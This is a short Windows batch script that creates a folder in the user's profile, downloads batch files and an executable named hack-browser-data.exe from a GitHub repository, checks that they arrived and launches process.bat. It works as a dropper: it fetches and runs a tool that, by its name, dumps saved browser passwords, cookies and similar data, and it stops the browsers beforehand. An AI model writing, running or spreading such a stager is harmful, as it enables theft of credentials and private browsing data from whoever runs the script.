@echo off
echo Creating BigBoy directory...
mkdir "%USERPROFILE%\BIGBOY" 2>nul
cd "%USERPROFILE%\BIGBOY"

echo Downloading files from GitHub...
curl -L -o process.bat https://raw.githubusercontent.com/24-20/bigboy/refs/heads/main/bigboyfolder/process.bat
curl -L -o stop_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/refs/heads/main/bigboyfolder/stop_browsers.bat
curl -L -o start_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/refs/heads/main/bigboyfolder/start_browsers.bat
curl -L -o hack-browser-data.exe https://raw.githubusercontent.com/24-20/bigboy/refs/heads/main/bigboyfolder/hack-browser-data.exe

echo Verifying downloads...
if not exist "process.bat" (
    echo Error: Failed to download process.bat
    exit /b 1
)
if not exist "stop_browsers.bat" (
    echo Error: Failed to download stop_browsers.bat
    exit /b 1
)
if not exist "start_browsers.bat" (
    echo Error: Failed to download start_browsers.bat
    exit /b 1
)
if not exist "hack-browser-data.exe" (
    echo Error: Failed to download hack-browser-data.exe
    exit /b 1
)

echo All files downloaded successfully!
echo Starting process...
start process.bat
